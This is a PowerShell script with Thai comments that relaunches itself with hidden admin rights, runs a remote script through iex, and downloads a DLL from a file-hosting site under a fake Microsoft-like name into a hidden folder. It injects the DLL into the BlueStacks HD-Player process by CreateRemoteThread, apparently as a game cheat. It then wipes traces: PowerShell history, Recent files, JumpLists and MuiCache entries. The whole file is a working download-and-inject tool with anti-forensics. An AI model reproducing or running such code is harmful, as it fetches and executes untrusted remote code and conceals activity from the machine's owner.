# =========================================================
# 1. ขอสิทธิ์ Administrator (จำเป็นสำหรับการ Inject)
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าไฟล์และการพรางตัว
# =========================================================
$url = "https://files.catbox.moe/0ukxya.dll" 
$fakeName = "mscories.dll" 
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" 

# =========================================================
# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์ระบบ)
# =========================================================
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# =========================================================
# 4. ดาวน์โหลด DLL
# =========================================================
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing

# =========================================================
# 5. C# Injector Code (LoadLibrary Method)
# =========================================================
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# =========================================================
# 6. ตรวจสอบกระบวนการและทำการ Inject
# =========================================================
if (Test-Path $dllPath) {
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        # ถ้าไม่เจอ ให้พยายามเปิด BlueStacks (ปรับ Path ตามจริง)
        if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
            Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
            Start-Sleep -Seconds 8 
            $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
        }
    }

    if ($proc) {
        Add-Type -TypeDefinition $Source
        [Injector]::Inject($proc.Id, $dllPath)
    }
}

# =========================================================
# 7. --- The Ghost Clean (ลบร่องรอยขั้นสูง) ---
# =========================================================
Start-Sleep -Seconds 5

# ลบไฟล์และโฟลเดอร์
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ล้าง PowerShell History
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }

# ล้างประวัติ Recent Files และ JumpLists (กันคนเช็ค Recent Files)
$recent = "$env:APPDATA\Microsoft\Windows\Recent"
Get-ChildItem -Path $recent -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue

# ล้าง MuiCache ใน Registry
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -ErrorAction SilentlyContinue
}

# รีสตาร์ท Explorer แบบไร้ร่องรอย (ใช้ Job เพื่อให้สคริปต์จบการทำงานได้ทันที)
Start-Job -ScriptBlock {
    Stop-Process -Name explorer -Force
    Start-Sleep -Seconds 1
    Start-Process explorer
} | Out-Null

exit